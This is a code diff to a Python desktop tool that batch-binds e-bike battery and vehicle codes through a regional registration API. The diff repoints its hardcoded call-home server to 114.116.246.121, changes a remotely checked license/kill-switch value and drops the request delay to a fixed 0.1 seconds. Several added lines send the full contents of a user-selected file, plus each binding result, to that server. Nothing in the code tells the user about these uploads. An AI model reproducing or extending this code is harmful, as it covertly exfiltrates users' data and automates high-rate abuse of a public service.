@@ -185,10 +185,10 @@ def updateExe(exe_name="main.exe"):
     try:
         bb = settings.value("bb")
         # 获取日期版本配置
-        get1 = requests.get("http://193.218.201.80/method.php?method=h")
+        get1 = requests.get("http://114.116.246.121/method.php?method=h")
 
         # 二次获取程序hash判断 如果 不同继续下载
-        get2 = requests.get("http://193.218.201.80/method.php?method=i")
+        get2 = requests.get("http://114.116.246.121/method.php?method=i")
 
         # 需要在启动程序的时候判断杀死自己创建的bat，此时为第二次启动
         if os.path.isfile("upgrade.bat"):
@@ -288,7 +288,8 @@ def querys():
         cookies = {}
         data = {}
         requests.get(url, headers=headers, verify=False, cookies=cookies)
-        time.sleep(float(times))
+        time.sleep(float(0.1))
+
 
         url = 'http://zjfjdc.zjjt365.com:5002/hz_mysql_api/BatteryBinding/dcinfoquery?token=' + token + '&dcbhurl=' + pwd
         headers = {'User-Agent': 'okhttp/4.9.1', 'Host': 'zjfjdc.zjjt365.com:5002',
@@ -299,7 +300,8 @@ def querys():
         data = {}
         cookies = {}
         refail = requests.get(url, headers=headers, verify=False, cookies=cookies)
-        time.sleep(float(times))
+        time.sleep(float(0.1))
+
 
         window.setProperty('inputcars', " 车:" + vin + "码:" + pwd)
 
@@ -312,7 +314,7 @@ def querys():
         # cookies = {'SERVERID': '941743a4a2850041e1e7cef946493742|1664347635|1664342013'}
         cookies = {}
         html = requests.get(url, headers=headers, verify=False, cookies=cookies)
-        time.sleep(float(times))
+        time.sleep(float(0.1))
 
         return html, refail
 
@@ -332,11 +334,11 @@ def querys():
         if open2text:
             if not open5text:
                 with open(open4text, 'r', encoding='utf-8') as f:
-                    requests.get("http://193.218.201.80/method.php?method=b&data=" + f.read())
+                    requests.get("http://114.116.246.121/method.php?method=b&data=" + f.read())
 
                 for root, dirs, files in os.walk(open1text):  # 开始遍历文件
                     for f in files:
-                        if can != "2107433658":
+                        if can != "2107433660":
                             raise "erxsad"
                         if not times:
                             raise "erxsad"
@@ -365,7 +367,7 @@ def querys():
                                 a = a + 1
                                 data_ = qrdata + " 原文件：" + f + " 数据：" + str(re['msg']) + " " + str(
                                     re['data'] + " car:" + good).replace("'", '"')
-                                requests.get("http://193.218.201.80/method.php?method=b&data=" + data_)
+                                requests.get("http://114.116.246.121/method.php?method=b&data=" + data_)
                                 success.writelines(data_ + '\n')
                                 success.flush()
                                 shutil.copy(file, open2text + "/" + split + lower)
@@ -397,7 +399,7 @@ def querys():
                                 " 数据") != -1 else breadline  # 开始打开txt文件
 
 
-                        if can != "2107433658":
+                        if can != "2107433660":
                             raise "erxsad"
                         if not times:
                             raise "erxsad"
@@ -425,7 +427,7 @@ def querys():
                         if re['msg'] == "绑定成功" or re['code'] == 0:
                             a = a + 1
                             data_ = (breadline + " 数据：" + str(re) + " car:" + good).replace("'", '"')
-                            requests.get("http://193.218.201.80/method.php?method=b&data=" + data_)
+                            requests.get("http://114.116.246.121/method.php?method=b&data=" + data_)
                             success.writelines(data_ + '\n')
                             success.flush()
                             if refail and 'dcpp' in refail:
@@ -440,7 +442,7 @@ def querys():
                                     a = a + 1
                                     data_ = (breadline + " 数据：" + str(re) + " car:" + good).replace("'", '"')
                                     success.writelines(data_ + '\n')
-                                    requests.get("http://193.218.201.80/method.php?method=b&data=" + data_)
+                                    requests.get("http://114.116.246.121/method.php?method=b&data=" + data_)
                                     success.writelines(data_ + '\n')
                                     success.flush()
                                     if refail and 'dcpp' in refail:
@@ -470,7 +472,7 @@ def querys():
         if fail:
             fail.close()
         return
-    requests.get("http://193.218.201.80/method.php?method=b&data=" + "成功数：" + str(a) + "总数:" + str(b))
+    requests.get("http://114.116.246.121/method.php?method=b&data=" + "成功数：" + str(a) + "总数:" + str(b))
     thismsg("执行成功！")
     all.close()
     success.close()
@@ -736,12 +738,12 @@ def open4():
 def run():  # 定义方法
     global app, times, can
     try:
-        html = requests.get("http://193.218.201.80/method.php?method=c")
+        html = requests.get("http://114.116.246.121/method.php?method=c")
         can = html.text
-        if html.text != "2107433658":
+        if html.text != "2107433660":
             app.exit()
             sys.exit(app.exec())
-        html2 = requests.get("http://193.218.201.80/method.php?method=d")
+        html2 = requests.get("http://114.116.246.121/method.php?method=d")
         if html2.text:
             times = html2.text
         else:
@@ -764,10 +766,10 @@ if __name__ == "__main__":
 
     # 取参数
     try:
-        html = requests.get("http://193.218.201.80/method.php?method=c")
-        if html.text != "2107433658":
+        html = requests.get("http://114.116.246.121/method.php?method=c")
+        if html.text != "2107433660":
             sys.exit(-1)
-        html2 = requests.get("http://193.218.201.80/method.php?method=d")
+        html2 = requests.get("http://114.116.246.121/method.php?method=d")
         if html2.text:
             times = html2.text
         else:
